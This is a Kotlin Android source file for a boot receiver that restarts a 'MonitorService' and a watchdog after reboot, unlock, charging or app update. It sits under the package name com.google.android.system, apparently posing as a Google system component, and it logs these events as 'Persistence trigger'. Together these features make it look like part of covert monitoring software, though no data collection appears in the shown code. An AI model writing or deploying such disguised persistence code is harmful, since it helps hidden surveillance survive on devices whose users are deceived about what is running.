package com.google.android.system

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

/**
 * BootReceiver
 *
 * Listens for BOOT_COMPLETED (and QUICKBOOT_POWERON for some OEM devices).
 * When the device finishes booting it automatically starts MonitorService
 * as a foreground service, so monitoring resumes without user interaction.
 *
 * NOTE: The user must have opened the app at least once after installation
 *       for this receiver to fire (Android 3.1+ background-start restriction).
 */
class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        if (action == Intent.ACTION_BOOT_COMPLETED ||
            action == "android.intent.action.QUICKBOOT_POWERON" ||
            action == Intent.ACTION_MY_PACKAGE_REPLACED ||
            action == Intent.ACTION_POWER_CONNECTED ||
            action == Intent.ACTION_USER_UNLOCKED
        ) {
            Log.i(TAG, "Persistence trigger ($action) – starting MonitorService")

            val serviceIntent = Intent(context, MonitorService::class.java)

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }
            } catch (e: Exception) {
                Log.w(TAG, "Failed to start MonitorService on $action trigger: ${e.message}. Scheduling WorkManager watchdog fallback...")
            }

            // Schedule / maintain WorkManager background watchdog
            ServiceWatchdogScheduler.scheduleWatchdog(context)
        }
    }
}
